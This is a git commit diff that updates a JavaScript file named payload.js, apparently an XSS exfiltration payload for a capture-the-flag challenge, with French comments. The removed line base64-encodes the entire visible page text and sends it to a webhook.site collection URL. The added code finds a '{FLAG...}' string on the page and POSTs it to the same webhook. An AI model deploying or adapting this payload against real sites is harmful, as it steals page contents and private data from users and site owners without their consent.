58c66a4deaeb67331e0cde734f8a5853d84cdfca
J4Admin <159776479+J4Admin@users.noreply.github.com>
2025-04-04 20:10:12 +0200

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,1 +1,11 @@
-new Image().src = "https://webhook.site/47f29ef8-e11a-461c-be8f-d3e4a576eb30?data=" + btoa(document.body.innerText);
+// Cherche le flag dans le texte visible
+const flag = document.body.innerText.match(/{FLAG.*?}/);
+
+// Envoie-le à ton webhook
+if (flag) {
+  fetch("https://webhook.site/47f29ef8-e11a-461c-be8f-d3e4a576eb30", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ flag: flag[0] })
+  });
+}
